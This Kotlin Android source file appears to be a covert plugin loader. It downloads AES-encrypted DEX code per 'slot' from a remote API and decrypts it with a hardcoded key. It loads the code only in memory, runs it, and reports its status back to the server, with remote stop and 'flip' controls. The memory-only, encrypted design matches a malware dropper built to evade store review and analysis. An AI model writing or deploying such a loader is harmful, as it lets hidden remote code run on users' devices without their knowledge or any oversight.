package com.nexrtz.loader

import android.content.Context
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.nexrtz.plugin.PluginEntry
import dalvik.system.InMemoryDexClassLoader
import java.lang.reflect.Modifier
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread

object MemoryOnlyLoader {
    private val activePlugins = mutableMapOf<String, PluginEntry>()
    private val activeLoaders = mutableMapOf<String, InMemoryDexClassLoader>()

    @RequiresApi(Build.VERSION_CODES.O)
    fun load(context: Context, slot: String) {
        thread {
            try {
                val enc = PluginApi.fetchDex(slot)
                val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding").apply {
                    init(Cipher.DECRYPT_MODE, SecretKeySpec(Config.AES_KEY, "AES"), IvParameterSpec(Config.AES_IV))
                }
                val rawDex = cipher.doFinal(enc)
                val loader = InMemoryDexClassLoader(ByteBuffer.wrap(rawDex), context.classLoader)

                activeLoaders[slot] = loader

                // We know the exact class name from our dex build!
                val className = "com.nexrtz.plugin.s$slot.Plugin"
                val c = loader.loadClass(className)

                // Safety check: make sure it's actually the plugin and not an interface
                if (!PluginEntry::class.java.isAssignableFrom(c) || c.isInterface || Modifier.isAbstract(c.modifiers)) {
                    throw Exception("Class $className does not implement PluginEntry properly")
                }

                val plugin = c.getDeclaredConstructor().newInstance() as PluginEntry
                activePlugins[slot] = plugin

                val result = plugin.start(context.applicationContext, slot)
                PluginApi.ackStatus(slot, "started")
                Log.d("Loader", "Slot $slot started: $result")
            } catch (e: Throwable) {
                Log.e("Loader", "Failed slot $slot", e)
                PluginApi.ackStatus(slot, "stopped")
            }
        }
    }

    fun stop(slot: String) {
        activePlugins[slot]?.stop()
        activePlugins.remove(slot)
        activeLoaders.remove(slot)
    }

    fun flip(slot: String) {
        activePlugins[slot]?.flip()
    }
}